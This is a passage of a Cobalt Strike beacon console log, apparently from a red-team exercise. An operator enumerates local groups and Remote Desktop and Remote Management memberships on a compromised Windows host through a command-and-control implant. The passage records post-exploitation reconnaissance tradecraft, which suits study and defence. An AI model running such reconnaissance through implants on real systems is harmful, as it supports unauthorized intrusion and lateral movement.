User's comment               

Country/region code          000 (System Default)

Account active               No

Account expires              Never



Password last set            3/28/2018 3:51:52 PM

Password expires             Never

Password changeable          3/29/2018 3:51:52 PM

Password required            Yes

User may change password     Yes



Workstations allowed         All

Logon script                 

User profile                 

Home directory               

Last logon                   4/20/2018 7:09:36 AM



Logon hours allowed          All



Local Group Memberships      *Administrators       

Global Group memberships     *None                 

The command completed successfully.




[10/19 16:38:57] beacon> shell netlocalgroup
[10/19 16:38:57] [*] Tasked beacon to run: netlocalgroup
[10/19 16:38:58] [+] host called home, sent: 44 bytes
[10/19 16:38:58] [+] received output:
'netlocalgroup' is not recognized as an internal or external command,

operable program or batch file.


[10/19 16:39:04] beacon> shell net localgroup
[10/19 16:39:04] [*] Tasked beacon to run: net localgroup
[10/19 16:39:04] [+] host called home, sent: 45 bytes
[10/19 16:39:05] [+] received output:


Aliases for \\MS01



-------------------------------------------------------------------------------

*Access Control Assistance Operators

*Administrators

*Backup Operators

*Certificate Service DCOM Access

*Cryptographic Operators

*Distributed COM Users

*Event Log Readers

*Guests

*Hyper-V Administrators

*IIS_IUSRS

*Network Configuration Operators

*Performance Log Users

*Performance Monitor Users

*Power Users

*Print Operators

*RDS Endpoint Servers

*RDS Management Servers

*RDS Remote Access Servers

*Remote Desktop Users

*Remote Management Users

*Replicator

*Storage Replica Administrators

*System Managed Accounts Group

*Users

The command completed successfully.




[10/19 16:39:19] beacon> shell net localgroup "Remote Desktop Users"
[10/19 16:39:19] [*] Tasked beacon to run: net localgroup "Remote Desktop Users"
[10/19 16:39:20] [+] host called home, sent: 68 bytes
[10/19 16:39:20] [+] received output:
Alias name     Remote Desktop Users

Comment        Members in this group are granted the right to logon remotely



Members



-------------------------------------------------------------------------------

The command completed successfully.




[10/19 16:39:34] beacon> shell net localgroup "Remote Management Users"
[10/19 16:39:34] [*] Tasked beacon to run: net localgroup "Remote Management Users"
[10/19 16:39:34] [+] host called home, sent: 71 bytes
[10/19 16:39:34] [+] received output:
Alias name     Remote Management Users

Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.



Members



-------------------------------------------------------------------------------

The command completed successfully.



```